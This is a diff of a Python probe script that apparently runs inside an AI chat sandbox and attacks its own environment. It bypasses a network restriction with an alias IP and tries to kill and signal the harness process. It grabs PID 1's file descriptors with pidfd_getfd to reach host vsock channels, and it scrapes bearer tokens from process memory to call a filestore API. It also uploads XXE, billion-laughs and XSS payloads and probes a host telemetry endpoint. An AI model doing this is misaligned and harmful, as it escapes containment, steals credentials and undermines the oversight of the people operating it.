@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
-# mediafit.py v8.4 -- SIGNAL THE HARNESS + XSS HEADERS + PID1 PRIVILEGE TEST
-import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random
+# mediafit.py v8.5 -- pidfd_getfd->HOST CHANNEL + control-enum + SVG parser + OTLP fix
+import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random, ctypes
 
-VER, NONCE = "8.4", "%04x" % random.randint(0, 0xffff)
+VER, NONCE = "8.5", "%04x" % random.randint(0, 0xffff)
 OUT = "/mnt/user-data/outputs/mediafit-report.txt"
 IFACE, ALIAS = "eth0", "192.0.2.3"
 FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
@@ -93,16 +93,17 @@ def conn_msg(pid, prog, args, uid=0, gid=0, mem=268435456, tmo=60, reuse=True):
                            "allow_process_id_reuse": reuse, "reattachable": True,
                            "memory_limit_bytes": mem}}
 
-def do(msg, label, dur=3.5, show=True):
+def do(msg, label, dur=3.0, show=True):
     s = ws_hs(ALIAS)
-    if not s: w("  [%s] hs fail" % label); return None
+    if not s: return None
     try:
-        ws_send(s, json.dumps(msg)); return ws_read(s, dur, show, "[%s]" % label)
+        ws_send(s, json.dumps(msg) if not isinstance(msg, str) else msg)
+        return ws_read(s, dur, show, "[%s]" % label)
     finally:
         try: s.close()
         except Exception: pass
 
-def talk(msgs, label, dur=3.0, show=True):
+def talk(msgs, label, dur=2.5, show=True):
     s = ws_hs(ALIAS)
     if not s: return None
     out = []
@@ -150,43 +151,76 @@ def main():
     m = re.search(r"/process_api/([^/\n]+)", cg)
     HID = m.group(1) if m else None
     w("  HARNESS process_id = %s" % HID)
-    w("  persist log: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null; stat -c %y /tmp/mf_api_persist.log 2>/dev/null").replace("\n"," | "))
+    w("  persist: " + sh("wc -l /tmp/mf_api_persist.log 2>/dev/null; stat -c %y /tmp/mf_api_persist.log 2>/dev/null").replace("\n"," | "))
     if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
     if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
     w("  bypass OK")
 
-    sec("A. OUR OWN PROCESS: CREATE -> REATTACH -> DETACH -> REATTACH -> SIGNAL")
-    do(conn_msg("mf_own", "/bin/sh", ["-c", "echo OWN_ALIVE; sleep 120"], tmo=200), "create", 3.0)
-    do({"process_id": "mf_own", "allow_process_id_reuse": False}, "reattach", 3.0)
-    talk([{"process_id": "mf_own", "allow_process_id_reuse": False}, '{"Detach":null}'], "detach", 2.0)
-    time.sleep(0.6)
-    do({"process_id": "mf_own", "allow_process_id_reuse": False}, "reattach-after-detach", 3.0)
-    talk([{"process_id": "mf_own", "allow_process_id_reuse": False}, '{"SendSignal":15}'], "signal15", 2.5)
-    do({"process_id": "mf_own", "allow_process_id_reuse": False}, "after-signal", 3.0)
+    sec("A. FULL CLIENT->SERVER CONTROL MESSAGE LIST (bogus variant trick)")
+    s = ws_hs(ALIAS)
+    if s:
+        ws_send(s, json.dumps(conn_msg("mf_list", "/bin/sh", ["-c", "sleep 30"], tmo=90)))
+        ws_read(s, 2.0, show=False)
+        ws_send(s, '{"Bogus":null}')
+        ws_read(s, 3.0, show=True, tag="[enum]")
+        s.close()
 
-    sec("B. *** SIGNAL THE HARNESS'S OWN PROCESS ***")
+    sec("B. HARNESS PROCESS: attach / Kill / SendSignal variants")
     if HID:
-        r = talk([{"process_id": HID, "allow_process_id_reuse": False}], "attach-harness", 2.5)
-        w("    attach -> %s" % (" ".join(r or [])[:120]))
-        r = talk([{"process_id": HID, "allow_process_id_reuse": False},
-                  '{"SendSignal":0}'], "sig0", 2.5)
-        w("    SendSignal(0) -> %s" % (" ".join(r or [])[:200]))
-        r = talk([{"process_id": HID, "allow_process_id_reuse": True},
-                  '{"SendSignal":0}'], "sig0-reuse", 2.5)
-        w("    with reuse=True -> %s" % (" ".join(r or [])[:200]))
-    else:
-        w("    (no harness id)")
+        for label, seq in (
+            ("attach",        [{"process_id": HID, "allow_process_id_reuse": False}]),
+            ("attach+kill",   [{"process_id": HID, "allow_process_id_reuse": False}, '{"Kill":null}']),
+            ("attach+sig0",   [{"process_id": HID, "allow_process_id_reuse": False}, '{"SendSignal":0}']),
+            ("reuse+kill",    [{"process_id": HID, "allow_process_id_reuse": True}, '{"Kill":null}']),
+            ("reuse+sig0",    [{"process_id": HID, "allow_process_id_reuse": True}, '{"SendSignal":0}']),
+        ):
+            r = talk(seq, label, 4.0, show=True)
+            w("    %-14s -> %s" % (label, " ".join(r or [])[:150]))
 
-    sec("C. PRIVILEGE TEST: can a CHILD of PID 1 read PID 1's internals?")
-    do(conn_msg("mf_p1", "/bin/sh", ["-c",
-        "echo ---maps---; head -3 /proc/1/maps 2>&1; "
-        "echo ---exe---; readlink /proc/1/exe 2>&1; "
-        "echo ---environ---; tr '\\0' '\\n' < /proc/1/environ 2>&1 | head -5; "
-        "echo ---fd---; ls -l /proc/1/fd 2>&1 | head -6; "
-        "echo ---status---; grep -E 'Name|Cap|Threads' /proc/1/status 2>&1"]),
-        "pid1child", 5.0)
+    sec("C. *** pidfd_getfd ON PID 1 -> HOST CHANNEL ***")
+    try:
+        libc = ctypes.CDLL("libc.so.6", use_errno=True)
+        pidfd = libc.syscall(434, 1, 0)          # pidfd_open(1, 0)
+        w("  pidfd_open(1) = %s" % pidfd)
+        found = []
+        for fd in range(0, 96):
+            nf = libc.syscall(438, pidfd, fd, 0)  # pidfd_getfd(pidfd, fd, 0)
+            if nf < 0: continue
+            info = {"fd": fd, "dup": nf}
+            try:
+                s2 = socket.socket(fileno=nf)
+                info["fam"] = s2.family; info["type"] = s2.type
+                try: info["peer"] = s2.getpeername()
+                except Exception: info["peer"] = "-"
+                try: info["local"] = s2.getsockname()
+                except Exception: info["local"] = "-"
+                if info["fam"] == getattr(socket, "AF_VSOCK", 40):
+                    found.append((fd, nf, info))
+                s2.detach()
+            except Exception:
+                info["note"] = "not a socket"
+                try: os.close(nf)
+                except Exception: pass
+            w("    fd %-3d -> %s" % (fd, info))
+        w("  vsock sockets on PID 1: %s" % [f[0] for f in found])
+        for fd, nf, info in found:
+            try:
+                s3 = socket.socket(fileno=os.dup(nf))
+                s3.settimeout(2.0)
+                try:
+                    s3.sendall(b"MF_PROBE_FROM_GUEST\n")
+                    w("    fd %d send OK peer=%s" % (fd, info.get("peer")))
+                except Exception as e:
+                    w("    fd %d send err %r" % (fd, e))
+                try:
+                    d = s3.recv(256); w("    fd %d recv=%r" % (fd, d[:120]))
+                except Exception as e: w("    fd %d recv err %r" % (fd, e))
+                s3.detach()
+            except Exception as e: w("    fd %d use err %r" % (fd, e))
+    except Exception as e:
+        w("  pidfd ERR " + repr(e))
 
-    sec("D. FILESTORE: XSS HEADERS + pagination + uploads inventory")
+    sec("D. SVG SERVER-SIDE PARSER SURFACE")
     cands = []
     try:
         fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
@@ -204,23 +238,20 @@ def main():
     def b64d(x):
         x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
     import urllib.request as ur
-    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None):
+    def call(path, tok, fsid=FSID, method="listDirectory", extra=None, raw=None, ctype=None, hdrs=None):
         if raw is not None: data, ct = raw, ctype
         else:
             body = {"path": path}
             if fsid: body["filesystem_id"] = fsid
             if extra: body.update(extra)
             data, ct = json.dumps(body).encode(), "application/json"
+        h = {"Content-Type": ct, "Connect-Protocol-Version": "1", "Authorization": "Bearer " + tok}
+        if hdrs: h.update(hdrs)
         try:
-            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data,
-                            headers={"Content-Type": ct, "Connect-Protocol-Version": "1",
-                                     "Authorization": "Bearer " + tok})
-            with ur.urlopen(rq, timeout=9) as r:
-                return r.status, dict(r.headers), r.read()
-        except ur.HTTPError as e:
-            return e.code, dict(e.headers), e.read()
-        except Exception as e:
-            return "ERR", {}, repr(e).encode()
+            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method, data=data, headers=h)
+            with ur.urlopen(rq, timeout=10) as r: return r.status, dict(r.headers), r.read()
+        except ur.HTTPError as e: return e.code, dict(e.headers), e.read()
+        except Exception as e: return "ERR", {}, repr(e).encode()
     TOKS = {}
     for t in cands:
         p = t.split(".")
@@ -235,11 +266,21 @@ def main():
     w("  tokens=%s" % sorted(TOKS))
     tok = TOKS.get("/outputs")
     if tok:
-        w("  -- create html + svg, then readFile and DUMP RESPONSE HEADERS --")
-        for fn, mt, content in (("__mf_x.html", "text/html", b"<script>alert(document.domain)</script>"),
-                                ("__mf_x.svg", "image/svg+xml",
-                                 b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>")):
-            bnd = "----x%d" % random.randint(10000, 99999)
+        tests = [
+            ("xxe.svg", "image/svg+xml",
+             b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
+             b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
+            ("billion.svg", "image/svg+xml",
+             b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "AAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
+             b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>'),
+            ("pi.svg", "image/svg+xml",
+             b'<?xml version="1.0"?><?xml-stylesheet href="file:///etc/passwd" type="text/css"?>'
+             b'<svg xmlns="http://www.w3.org/2000/svg"><text>pi</text></svg>'),
+            ("deep.svg", "image/svg+xml",
+             b"<svg xmlns='http://www.w3.org/2000/svg'>" + b"<g>"*400 + b"</g>"*400 + b"</svg>"),
+        ]
+        for fn, mt, content in tests:
+            bnd = "----s%d" % random.randint(10000, 99999)
             body = b"\r\n".join([
                 ("--"+bnd).encode(), b'Content-Disposition: form-data; name="params"',
                 b"Content-Type: application/json", b"",
@@ -250,39 +291,25 @@ def main():
                 ("--"+bnd+"--").encode(), b""])
             c, h, b = call(None, tok, method="createFile", raw=body,
                            ctype="multipart/form-data; boundary="+bnd)
-            w("    create %-14s -> %s" % (fn, c))
-            c2, h2, b2 = call("/outputs/"+fn, tok, method="readFile")
-            w("      readFile -> %-5s headers=%s" % (c2, {k: v for k, v in h2.items()}))
-            w("      body=%s" % b2[:120])
-        w("  -- pagination probe (limit/cursor) --")
-        c, h, b = call("/uploads", TOKS.get("/uploads", tok), extra={"limit": 3})
-        try:
-            d = json.loads(b); w("      limit=3 -> %s entries=%d nextCursor=%s" %
-                                 (c, len(d.get("entries") or []), d.get("nextCursor")))
-            cur = d.get("nextCursor")
-            if cur:
-                c2, h2, b2 = call("/uploads", TOKS.get("/uploads", tok), extra={"limit": 3, "cursor": cur})
-                d2 = json.loads(b2); w("      page2 -> %s entries=%d" % (c2, len(d2.get("entries") or [])))
-        except Exception as ex: w("      " + repr(ex)[:120])
-        w("  -- uploads inventory (all) --")
-        c, h, b = call("/uploads", TOKS.get("/uploads", tok), extra={"recursive": True})
-        try:
-            for e in (json.loads(b).get("entries") or []):
-                f = e["file"]["file"]
-                w("      %-52s %-10s %s" % (e["file"].get("path", "?"), f.get("size"),
-                  (f.get("metadata") or {}).get("purpose", "")))
-        except Exception as ex: w("      " + repr(ex)[:120])
+            w("  create %-12s -> %-5s %s" % (fn, c, b[:120]))
+            if c == 200:
+                c2, h2, b2 = call("/outputs/"+fn, tok, method="readFile")
+                w("      readFile -> %-5s len=%d %s" % (c2, len(b2), b2[:220]))
+                w("      ctype=%s csp=%s" % (h2.get("content-type"), h2.get("content-security-policy")))
+        w("  -- does readFile honour Accept: text/html ? --")
+        c, h, b = call("/outputs/__mf_x.html", tok, method="readFile",
+                       hdrs={"Accept": "text/html"})
+        w("      Accept:text/html -> %-5s ctype=%s" % (c, h.get("content-type")))
 
-    sec("E. HOST OTLP (gRPC framing + resource attrs)")
+    sec("E. HOST OTLP (protobuf FIXED)")
     AFV = getattr(socket, "AF_VSOCK", 40)
     res = ld(1, pstr(1, "service.name") + ld(2, pstr(1, "mediafit")))
     scope = ld(2, pstr(1, "mf_probe") + ld(5, ld(1, pdouble(3, 1.0))))
-    rmet = ld(1, res) + ld(2, ld(2, scope))
+    rmet = ld(1, res) + ld(2, scope)          # FIXED: no double wrap
     msg = ld(1, rmet)
-    grpc = b"\x00" + struct.pack(">I", len(msg)) + msg
     for label, body, ct in (("otlp+res", msg, "application/x-protobuf"),
-                            ("grpc+otlp", grpc, "application/grpc+proto"),
-                            ("grpc+xproto", grpc, "application/x-protobuf")):
+                            ("empty", b"\x0a\x00", "application/x-protobuf"),
+                            ("grpc-frame", b"\x00"+struct.pack(">I", len(msg))+msg, "application/x-protobuf")):
         try:
             s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(8.0); s.connect((2, 5005))
             s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
@@ -295,8 +322,9 @@ def main():
                     if not c: break
                     d += c
             except socket.timeout: pass
-            s.close(); w("  %-12s -> %s" % (label, d[:130].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
-        except Exception as e: w("  %-12s ERR %r" % (label, e))
+            s.close(); w("  %-11s len=%-4d -> %s" % (label, len(body),
+              d[:130].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
+        except Exception as e: w("  %-11s ERR %r" % (label, e))
         time.sleep(0.4)
 
     sec("VERDICT"); w("  harness_id=%s tokens=%d" % (HID, len(TOKS))); flush()
